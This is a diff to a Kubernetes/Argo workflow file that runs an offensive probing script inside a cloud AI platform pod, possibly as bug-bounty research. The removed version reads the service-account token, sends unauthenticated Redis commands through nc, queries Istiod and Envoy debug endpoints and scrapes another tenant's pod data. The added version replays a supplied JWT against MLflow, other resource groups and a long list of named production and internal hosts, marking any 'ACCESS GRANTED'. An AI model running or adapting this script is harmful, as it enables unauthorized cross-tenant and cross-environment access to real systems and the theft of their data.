@@ -10,142 +10,151 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "30.0.0"
+    ai.sap.com/version: "31.0.0"
 spec:
   entrypoint: main
+  arguments:
+    parameters:
+    - name: jwt
+      description: "API JWT token"
   templates:
   - name: main
+    inputs:
+      parameters:
+      - name: jwt
     metadata:
       labels:
         ai.sap.com/resourcePlan: starter
     container:
       image: nicolaka/netshoot:latest
+      env:
+      - name: API_JWT
+        value: "{{inputs.parameters.jwt}}"
       command:
       - bash
       - -c
       - |
-        echo "=== V30 ENVOY-PROXIED SERVICE INTERACTION ==="
+        echo "=== V31 JWT PIVOTING + CROSS-ENV ACCESS ==="
         echo "=== $(date -u) ==="
+        echo "[*] JWT length: ${#API_JWT}"
 
         # -------------------------------------------------------
-        # PHASE 1: Use Envoy sidecar as mTLS proxy
-        # The sidecar intercepts outbound traffic to known services
-        # and automatically applies mTLS. Use service DNS names.
+        # PHASE 1: MLflow with API JWT
         # -------------------------------------------------------
-        echo "=== PHASE1: SERVICE ACCESS VIA ENVOY SIDECAR ==="
-
-        # MLflow - auth succeeded with JWT before, try via sidecar
-        echo "[*] MLflow via sidecar (HTTP):"
-        curl -sv --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | tail -20
+        echo "=== PHASE1: MLFLOW CROSS-TENANT ==="
+        echo "[*] MLflow experiments list:"
+        curl -s --connect-timeout 5 \
+          -H "Authorization: Bearer ${API_JWT}" \
+          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000
         echo ""
 
-        # Try with our API JWT
-        API_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "no-sa-token")
-        echo "[*] SA token available: $(echo $API_TOKEN | head -c 20)..."
-
-        echo "[*] MLflow experiments list (via sidecar, no extra auth):"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 2000
+        echo "[*] MLflow experiments search:"
+        curl -s --connect-timeout 5 \
+          -H "Authorization: Bearer ${API_JWT}" \
+          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 3000
         echo ""
 
-        echo "[*] MLflow experiments search (via sidecar):"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 2000
+        echo "[*] MLflow runs search (all experiments):"
+        curl -s --connect-timeout 5 -X POST \
+          -H "Authorization: Bearer ${API_JWT}" \
+          -H "Content-Type: application/json" \
+          -d '{"max_results":10}' \
+          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" 2>&1 | head -c 3000
         echo ""
 
-        # Usage API
-        echo "[*] Usage API via sidecar:"
-        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/" 2>&1 | head -c 500
-        echo ""
-
-        # Dynatrace ActiveGate
-        echo "[*] Dynatrace ActiveGate via sidecar:"
-        curl -s --connect-timeout 5 "http://dynakube-activegate.dynatrace.svc.cluster.local/" 2>&1 | head -c 500
+        echo "[*] MLflow registered models:"
+        curl -s --connect-timeout 5 \
+          -H "Authorization: Bearer ${API_JWT}" \
+          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/registered-models/list?max_results=100" 2>&1 | head -c 3000
         echo ""
 
         # -------------------------------------------------------
-        # PHASE 2: ArgoCD Redis - proper protocol
+        # PHASE 2: Test external SAP AI Core hosts with JWT
+        # From inside the pod (internal network)
         # -------------------------------------------------------
-        echo "=== PHASE2: ARGOCD REDIS DEEP PROBE ==="
+        echo "=== PHASE2: CROSS-ENVIRONMENT JWT TEST ==="
 
-        # Use the DNS-resolved IPs
-        for REDIS_HOST in \
-          "argocd-redis-ha.argocd-tenants.svc.cluster.local" \
-          "argocd-redis-ha-announce-0.argocd-tenants.svc.cluster.local" \
-          "100.64.54.30"; do
-          echo "[*] Redis probe: ${REDIS_HOST}:6379"
+        # High-value targets first
+        for host in \
+          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
+          "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
+          "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
+          "internalprod.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-1.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-2.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-3.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-4.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-5.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod.eu-central-1.aws.ml.hana.ondemand.com" \
+          "preprod.eu-central-1.aws.ml.hana.ondemand.com" \
+          "sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
+          "trial.eu-central-1.aws.ml.hana.ondemand.com" \
+          "training.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-us-1.us-east-1.aws.ml.hana.ondemand.com" \
+          "prod-us-2.us-east-1.aws.ml.hana.ondemand.com" \
+          "prod.us-east-1.aws.ml.hana.ondemand.com" \
+          "preprod.us-east-1.aws.ml.hana.ondemand.com" \
+          "prod.ap-northeast-1.aws.ml.hana.ondemand.com" \
+          "prod.ap-southeast-2.aws.ml.hana.ondemand.com" \
+          "intprod-eu12.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prodeuonly.eu-central-1.aws.ml.hana.ondemand.com" \
+          "bocr-eu-prd.eu-central-1.aws.ml.hana.ondemand.com" \
+          "bocr-us-prod.us-east-1.aws.ml.hana.ondemand.com" \
+          "workshop.eu-central-1.aws.ml.hana.ondemand.com" \
+          "perf-eu10.eu-central-1.aws.ml.hana.ondemand.com"; do
 
-          # Proper Redis protocol: *1\r\n$4\r\nPING\r\n
-          printf '*1\r\n$4\r\nPING\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1
-          echo " (ping)"
+          # Quick check: resolve + hit /v2/lm/scenarios with our JWT
+          resp=$(curl -sk --connect-timeout 3 --max-time 5 \
+            -o /tmp/host_resp.txt -w "%{http_code}" \
+            -H "Authorization: Bearer ${API_JWT}" \
+            -H "AI-Resource-Group: default" \
+            "https://${host}/v2/lm/scenarios" 2>/dev/null)
 
-          # Try INFO
-          printf '*1\r\n$4\r\nINFO\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1 | head -c 500
-          echo " (info)"
-
-          # Try without AUTH - KEYS *
-          printf '*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n' | nc -w3 ${REDIS_HOST} 6379 2>&1 | head -c 500
-          echo " (keys)"
-
-          echo ""
+          if [ "$resp" != "000" ]; then
+            body=$(head -c 200 /tmp/host_resp.txt)
+            echo "[${resp}] ${host}"
+            if [ "$resp" = "200" ]; then
+              echo "  >>> ACCESS GRANTED: ${body}"
+            elif [ "$resp" != "401" ] && [ "$resp" != "403" ] && [ "$resp" != "404" ]; then
+              echo "  >>> ${body}"
+            fi
+          fi
         done
 
-        # Sentinel port
-        echo "[*] Redis Sentinel probe:"
-        printf '*1\r\n$4\r\nPING\r\n' | nc -w3 argocd-redis-ha.argocd-tenants.svc.cluster.local 26379 2>&1
-        echo " (sentinel ping)"
-        printf '*2\r\n$8\r\nSENTINEL\r\n$7\r\nMASTERS\r\n' | nc -w3 argocd-redis-ha.argocd-tenants.svc.cluster.local 26379 2>&1 | head -c 500
-        echo " (sentinel masters)"
+        # -------------------------------------------------------
+        # PHASE 3: Internal-only hosts (may only resolve from inside)
+        # -------------------------------------------------------
+        echo "=== PHASE3: INTERNAL DNS RESOLUTION ==="
+        for host in \
+          "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
+          "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
+          "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
+          "training.internalprod.eu-central-1.aws.ml.hana.ondemand.com" \
+          "esam.prod.eu-central-1.aws.ml.hana.ondemand.com" \
+          "esam.preprod.eu-central-1.aws.ml.hana.ondemand.com"; do
+          ip=$(nslookup "$host" 2>/dev/null | grep "Address:" | tail -1 | awk '{print $2}')
+          if [ -n "$ip" ] && [ "$ip" != "100.104.0.10" ]; then
+            echo "[+] ${host} -> ${ip}"
+          fi
+        done
 
         # -------------------------------------------------------
-        # PHASE 3: Istiod via sidecar + different ports
+        # PHASE 4: Same JWT against our own API but from inside
         # -------------------------------------------------------
-        echo "=== PHASE3: ISTIOD DEEP PROBE ==="
-        echo "[*] Istiod via sidecar DNS:"
-        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz" 2>&1 | head -c 2000
-        echo ""
-        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/registryz" 2>&1 | head -c 2000
-        echo ""
-        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15014/debug/syncz" 2>&1 | head -c 2000
-        echo ""
-        # Istiod monitoring port
-        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15010/debug/endpointz" 2>&1 | head -c 1000
-        echo ""
-        # Istiod gRPC (xDS)
-        curl -s --connect-timeout 3 "http://istiod.istio-system.svc.cluster.local:15012/" 2>&1 | head -c 500
+        echo "=== PHASE4: API FROM INSIDE POD ==="
+        echo "[*] Scenarios via API:"
+        curl -s --connect-timeout 5 \
+          -H "Authorization: Bearer ${API_JWT}" \
+          -H "AI-Resource-Group: default" \
+          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/scenarios" 2>&1 | head -c 500
         echo ""
 
-        # -------------------------------------------------------
-        # PHASE 4: Envoy detailed cluster + listener info
-        # Which services does Envoy know how to reach?
-        # -------------------------------------------------------
-        echo "=== PHASE4: ENVOY SERVICE MAP ==="
-        echo "[*] All outbound clusters (service routes):"
-        curl -s http://localhost:15000/clusters 2>&1 | grep "^outbound" | grep -oE 'outbound\|[0-9]+\|[^:]+' | sort -u | head -40
-        echo ""
-        echo "[*] Listener ports:"
-        curl -s http://localhost:15000/listeners 2>&1 | grep -oE '"name":"[^"]*"' | sort -u | head -30
+        # Try accessing other resource groups
+        echo "[*] Executions with bb-test-rg:"
+        curl -s --connect-timeout 5 \
+          -H "Authorization: Bearer ${API_JWT}" \
+          -H "AI-Resource-Group: bb-test-rg" \
+          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/executions" 2>&1 | head -c 500
         echo ""
 
-        # -------------------------------------------------------
-        # PHASE 5: Direct access to other tenant namespace
-        # We know rg-4b258265-cd927cab exists (from KSM v27)
-        # -------------------------------------------------------
-        echo "=== PHASE5: CROSS-TENANT NAMESPACE PROBE ==="
-        echo "[*] Pods in other tenant namespace (from KSM):"
-        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | \
-          grep "kube_pod_info" | grep "rg-4b258265" | head -10
-        echo ""
-
-        # Try to reach services in the other tenant namespace
-        echo "[*] DNS for other tenant services:"
-        nslookup "*.rg-4b258265-cd927cab.svc.cluster.local" 2>&1 | tail -5
-        echo ""
-
-        # K8s API server probe (last resort)
-        echo "=== PHASE6: K8S API ==="
-        echo "[*] K8s API at kubernetes.default:"
-        curl -sk --connect-timeout 3 "https://kubernetes.default.svc.cluster.local/version" 2>&1 | head -c 300
-        echo ""
-        curl -sk --connect-timeout 3 "https://kubernetes.default.svc.cluster.local/api" 2>&1 | head -c 300
-        echo ""
-
-        echo "=== V30 DONE $(date -u) ==="
+        echo "=== V31 DONE $(date -u) ==="
